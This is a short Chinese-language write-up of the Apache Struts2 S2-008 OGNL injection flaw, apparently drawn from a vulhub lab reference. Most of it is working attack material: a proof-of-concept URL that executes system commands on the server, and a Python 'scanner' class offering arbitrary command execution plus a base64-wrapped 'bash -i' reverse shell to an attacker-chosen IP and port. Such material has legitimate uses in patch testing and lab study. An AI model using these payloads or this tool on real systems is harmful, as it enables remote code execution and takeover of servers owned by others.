# Struts2-008

## 漏洞介绍

Struts2-008存在中的多个关键漏洞,而Struts2-008主要是利用对传入参数没有严格限制，导致多个地方可以执行恶意代码，传入`?debug=command&expression=`即可执行OGNL表达式

## 漏洞版本

影响版本：Struts 2.1.0 – 2.3.1

官方通告：https://cwiki.apache.org/confluence/display/WW/S2-008

## poc

```java
devmode.action?debug=command
    &expression=(
    %23_memberAccess["allowStaticMethodAccess"]=true,
    %23foo=new java.lang.Boolean("false"),
    %23context["xwork.MethodAccessor.denyMethodExecution"]=%23foo,             
    @org.apache.commons.io.IOUtils@toString(
        @java.lang.Runtime@getRuntime().exec('env').getInputStream()
    )
)
```

## 扫描器

```python
class S2_008:
    """S2-008漏洞检测利用类"""
    info = "[+] S2-008:影响版本Struts 2.1.0-2.3.1; GET请求发送数据; 支持任意命令执行和反弹shell"
    exec_payload = "/devmode.action?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27{cmd}%27%29.getInputStream%28%29%29)"

    shell = "bash -c {echo,SHELL}|{base64,-d}|{bash,-i}"

    def __init__(self, url, data=None, headers=None, encoding="UTF-8"):
        self.url = url
        self.headers = parse_headers(headers)
        self.encoding = encoding
        self.is_vul = False

    def check(self):
        """检测漏洞是否存在"""
        html = echo_check(self)
        if str(html).startswith("ERROR:"):
            return html
        if html:
            self.is_vul = True
            return 'S2-008'
        return self.is_vul

    def exec_cmd(self, cmd):
        """执行命令"""
        payload = self.exec_payload.format(cmd=quote(cmd))
        html = get(self.url + payload, self.headers, self.encoding)
        return html

    def reverse_shell(self, ip, port):
        """反弹shell"""
        html = reverse_shell(self, ip, port)
        return html
```

## 参考

>https://github.com/vulhub/vulhub/blob/master/struts2/s2-008/README.zh-cn.md
